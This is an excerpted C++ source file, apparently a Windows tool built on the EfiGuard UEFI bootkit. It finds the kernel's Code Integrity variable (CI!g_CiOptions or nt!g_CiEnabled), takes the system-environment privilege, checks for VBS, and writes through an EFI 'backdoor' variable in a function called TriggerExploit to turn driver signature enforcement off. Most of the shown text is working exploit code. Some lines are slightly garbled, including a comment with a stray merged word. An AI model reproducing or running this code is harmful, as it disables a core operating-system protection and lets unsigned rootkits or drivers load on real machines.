...
static LONG QueryCiEnabled(_In_ PVOID MappedBase,_In_ SIZE_T SizeOfImage,_In_ ULONG_PTR KernelBase,_Out_ PULONG_PTR gCiEnabledAddress){
*gCiEnabledAddress = 0;
...
static LONG QueryCiOptions(_In_ PVOID MappedBase,_In_ ULONG_PTR CiDllBase,_Out_ PULONG_PTR gCiOptionsAddress){
*gCiOptionsAddress = 0;
...
static BOOLEAN QueryVbsEnabled(){
SYSTEM_CODEINTEGRITY_INFORMATION CodeIntegrityInfo = { sizeof(SYSTEM_CODEINTEGRITY_INFORMATION) };
NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,&CodeIntegrityInfo,sizeof(CodeIntegrityInfo),nullptr);
if (NT_SUCCESS(Status) &&
...
static NTSTATUS AnalyzeCi(_Out_ PVOID *CiOptionsAddress){
...
//Somehow This Has Something To Do With The Mapping But I Dont Understand C++ Enough To Understand Why
_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs",
SharedUserData->NtSystemRoot,NtCurrentPeb()->OSBuildNumber >= 9200 ? CiDll : NtoskrnlExe);

PVOID MappedBase;
SIZE_T ViewSize;
NTSTATUS Status = MapFileSectionView(Path, &MappedBase, &ViewSize);
if (!NT_SUCCESS(Status)){
std::cout << "Failed To Map "+ ToString(Path) +": 0x" + ToHex((long)Status) + "\n";
std::cout.flush();
return Status;
}
...
static NTSTATUS SetSystemEnvironmentPrivilege(_In_ BOOLEAN Enable,_Out_opt_ PBOOLEAN WasEnabled){
if (WasEnabled != nullptr)
*WasEnabled = FALSE;

BOOLEAN SeSystemEnvironmentWasEnabled;
const NTSTATUS Status = RtlAdjustPrivilege(SE_SYSTEM_ENVIRONMENT_PRIVILEGE,Enable,FALSE,&SeSystemEnvironmentWasEnabled);
...
if (!NT_SUCCESS(Status)){
std::cout<<"Fatal Error: Failed To Acquire SE_SYSTEM_ENVIRONMENT_PRIVILEGE. Make Sure You Are Running As Administrator.\n";
std::cout.flush();
return Status;
}

if (QueryVbsEnabled()){
std::cout<<ToString(L"Fatal Error: VBS (Virtualization Based Security) Is Enabled And Running On This System.\n"
L"Attempting To Read Or Write To Or From Kernel Space Using EFI Runtime Services Will Result In A Bugcheck.\n"
L"Either The EfiGuard DXE Driver Is Not Loaded, Or It Failed To Disable VBS During Boot.\n"
L"Not Continuing.\n");
std::cout.flush();
...
Status = NtSetSystemEnvironmentValueEx(&VariableName,EFIGUARD_BACKDOOR_VARIABLE_GUID,&BackdoorData,EFIGUARD_BACKDOOR_VARIABLE_DATASIZE,EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES);
if (!NT_SUCCESS(Status)){
std::cout << "Failure: NtSetSystemEnvironmentValueEx: Error 0x"+ ToHex((long)Status) + "\n";
std::cout.flush();
}else if (BackdoorData.u.Qword == UINT64_MAX){
std::cout<<"Failure: EFI SetVariable() Did Not Return Any Data.\n";
std::cout.flush();
...
if (!NT_SUCCESS(Status)){
std::cout<<"The NHA EFI Driver Is Either Not Loaded, Or It Is Malfunctioning.\n";
std::cout.flush();
goto Exit;
}
...
if (Mz != 0x5A4D){
std::cout<<(L"Failure: received unexpected data from test read of 0x%p. Expected: 4D 5A, received: %02X %02X.\n",
...
static NTSTATUS TriggerExploit(_In_ PVOID CiVariableAddress,_In_ ULONG CiOptionsValue,_Out_opt_ PULONG OldCiOptionsValue,_In_ BOOLEAN ReadOnly){
...
EFIGUARD_BACKDOOR_DATA BackdoorData;
RtlZeroMemory(&BackdoorData, sizeof(BackdoorData));
BackdoorData.CookieValue = EFIGUARD_BACKDOOR_COOKIE_VALUE;// AuAdjustCiOptionsthentication cookie
...
Status = NtSetSystemEnvironmentValueEx(&VariableName,EFIGUARD_BACKDOOR_VARIABLE_GUID,&BackdoorData,EFIGUARD_BACKDOOR_VARIABLE_DATASIZE,EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES);
if (!NT_SUCCESS(Status)){
std::cout << "NtSetSystemEnvironmentValueEx: Error: 0x" + ToHex((long)Status) + "\n";
return Status;
}
...
NTSTATUS AdjustCiOptions(_In_ ULONG CiOptionsValue,_Out_opt_ PULONG OldCiOptionsValue,_In_ BOOLEAN ReadOnly){
if (OldCiOptionsValue != nullptr)
*OldCiOptionsValue = CODEINTEGRITY_OPTION_ENABLED;
...
std::cout << ToString(NtCurrentPeb()->OSBuildNumber >= 9200 ? L"CI!g_CiOptions" : L"nt!g_CiEnabled") + " @ 0x" + ToHex((long)CiOptionsAddress) + "\n";
std::cout.flush();
...
// Enable/disable CI
Status = TriggerExploit(CiOptionsAddress,CiOptionsValue,OldCiOptionsValue,ReadOnly);
